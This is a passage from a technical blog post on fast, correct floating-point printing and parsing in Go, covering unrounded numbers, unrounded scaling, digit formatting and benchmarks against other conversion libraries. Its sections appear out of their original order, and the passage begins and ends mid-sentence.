whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide ~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems: Floating-point numbers are the same as base-2 fixed-point numbers except thatechanges with\nthe overall size of the number.\nSmall numbers use very small scaling factors\nwhile large numbers use large scaling factors,\naiming to keep the mantissas a constant length.\nFor float64s, the exponenteis chosen so that the mantissamhas 53 bits,\nmeaningm∈[252,253).\nFor example, for numbers in[½,1), float64s usee=−53;\nfor numbers in[1,2)they usee=−52;\nand so on.[The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point 